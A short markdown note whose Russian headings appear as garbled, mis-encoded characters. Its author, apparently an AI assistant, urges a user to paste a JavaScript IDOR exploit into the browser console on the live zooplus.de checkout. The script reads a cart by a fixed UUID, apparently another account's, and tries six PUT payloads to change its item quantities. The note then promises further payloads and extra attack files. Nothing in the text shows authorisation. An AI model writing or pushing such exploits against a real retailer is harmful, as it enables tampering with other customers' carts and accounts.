# üö® –ö–†–ò–¢–ò–ß–ï–°–ö–ò –í–ê–ñ–ù–û: –í—ã–ø–æ–ª–Ω–∏—Ç—å —Ç–µ—Å—Ç –°–ï–ô–ß–ê–°

## ‚úÖ –ß—Ç–æ —è –Ω–∞—à–µ–ª:

1. **Endpoint**: `PUT /semiprotected/api/checkout/state-api/v2/set-article-quantity`
2. **–ú–µ—Ç–æ–¥**: PUT (–Ω–µ POST!)
3. **–°—Ç–∞—Ç—É—Å**: 200 (–∑–∞–ø—Ä–æ—Å —É—Å–ø–µ—à–µ–Ω –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞)

## üéØ –í—ã–ø–æ–ª–Ω–∏—Ç–µ —Ç–µ—Å—Ç –ü–†–Ø–ú–û –°–ï–ô–ß–ê–°:

### –®–∞–≥ 1: –û—Ç–∫—Ä–æ–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É
https://www.zooplus.de/checkout/cart

### –®–∞–≥ 2: –£–±–µ–¥–∏—Ç–µ—Å—å —á—Ç–æ –∑–∞–ª–æ–≥–∏–Ω–µ–Ω—ã –ø–æ–¥ Account B

### –®–∞–≥ 3: –û—Ç–∫—Ä–æ–π—Ç–µ DevTools (F12) ‚Üí Console

### –®–∞–≥ 4: –°–∫–æ–ø–∏—Ä—É–π—Ç–µ –∏ –≤—ã–ø–æ–ª–Ω–∏—Ç–µ —ç—Ç–æ—Ç –∫–æ–¥:

```javascript
const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";
(async function() {
  console.log("[*] Starting IDOR Write Test...");
  const cartBefore = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {credentials: 'include'}).then(r => r.json());
  const beforeCount = cartBefore.articles.length;
  const beforeTotal = cartBefore.summary.grandTotal;
  const articleId = cartBefore.articles[0]?.id;
  const cartId = cartBefore.cartId;
  const sid = cartBefore.sid;
  console.log(`[+] Before: ${beforeCount} items, ${beforeTotal} EUR, Article: ${articleId}`);
  const payloads = [
    {name: "articleId+quantity", p: {articleId: articleId, quantity: 2}},
    {name: "id+quantity", p: {id: articleId, quantity: 2}},
    {name: "With cartUuid", p: {articleId: articleId, quantity: 2, cartUuid: CART_UUID}},
    {name: "With sid", p: {articleId: articleId, quantity: 2, sid: sid}},
    {name: "With cartId", p: {articleId: articleId, quantity: 2, cartId: cartId}},
    {name: "Full", p: {articleId: articleId, quantity: 2, cartUuid: CART_UUID, sid: sid, cartId: cartId}}
  ];
  for (const test of payloads) {
    console.log(`[*] Testing: ${test.name}`);
    try {
      const r = await fetch(`https://www.zooplus.de/semiprotected/api/checkout/state-api/v2/set-article-quantity`, {
        method: "PUT", credentials: "include",
        headers: {"Content-Type": "application/json", "Accept": "application/json"},
        body: JSON.stringify(test.p)
      });
      const ct = r.headers.get("content-type") || "";
      const text = await r.text();
      console.log(`    Status: ${r.status}, CT: ${ct}`);
      if (r.status === 200 && ct.includes("json")) {
        try {
          const json = JSON.parse(text);
          console.log(`    [!!!] SUCCESS! JSON:`, JSON.stringify(json).substring(0, 150));
          break;
        } catch(e) {}
      }
    } catch(e) { console.log(`    Error: ${e.message}`); }
  }
  const cartAfter = await fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {credentials: 'include'}).then(r => r.json());
  const afterCount = cartAfter.articles.length;
  const afterTotal = cartAfter.summary.grandTotal;
  console.log(`[+] After: ${afterCount} items, ${afterTotal} EUR`);
  if (afterCount !== beforeCount || Math.abs(afterTotal - beforeTotal) > 0.01) {
    console.log("\n[!!!] CRITICAL IDOR WRITE CONFIRMED!");
    console.log(`[!!!] Before: ${beforeCount} items, ${beforeTotal} EUR`);
    console.log(`[!!!] After: ${afterCount} items, ${afterTotal} EUR`);
  } else {
    console.log("\n[!] Cart unchanged");
  }
})();
```

## üìä –†–µ–∑—É–ª—å—Ç–∞—Ç:

- **–ï—Å–ª–∏ –∫–æ—Ä–∑–∏–Ω–∞ –∏–∑–º–µ–Ω–∏–ª–∞—Å—å** ‚Üí Critical IDOR Write –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω! –ü—Ä–∏—à–ª–∏—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç –∫–æ–Ω—Å–æ–ª–∏.
- **–ï—Å–ª–∏ –Ω–µ –∏–∑–º–µ–Ω–∏–ª–∞—Å—å** ‚Üí –ü—Ä–∏—à–ª–∏—Ç–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∏–∑ –∫–æ–Ω—Å–æ–ª–∏, –ø—Ä–æ–¥–æ–ª–∂—É –∏—Å–∫–∞—Ç—å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π payload.

## üìÅ –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ —Ñ–∞–π–ª—ã:

- `test_inline.js` - —Ç–æ—Ç –∂–µ –∫–æ–¥ –≤ —Ñ–∞–π–ª–µ
- `FINAL_IDOR_WRITE_TEST.js` - —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è
- `test_all_put_variants.js` - –ø–æ–ª–Ω—ã–π —Ç–µ—Å—Ç (14 –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤)
- `auto_test_idor_write.html` - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π HTML —Ç–µ—Å—Ç

